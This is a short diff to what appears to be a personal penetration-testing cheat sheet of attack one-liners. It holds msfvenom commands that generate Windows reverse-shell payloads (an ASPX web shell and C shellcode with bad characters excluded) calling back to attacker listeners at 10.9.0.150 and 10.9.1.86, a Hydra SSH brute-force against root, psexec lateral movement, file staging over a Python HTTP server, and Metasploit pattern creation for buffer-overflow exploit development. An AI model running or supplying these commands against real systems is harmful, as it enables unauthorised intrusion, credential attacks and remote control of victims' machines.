@@ -15,3 +15,5 @@ psexec.py DOM/USER@IP
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.0.150 LPORT=9876 -f aspx -o lolo.aspx
 python -m http.server 9880
 hydra -l root -P dico -s 22 -f 192.168.1.1 ssh
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.86 LPORT=9876 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c
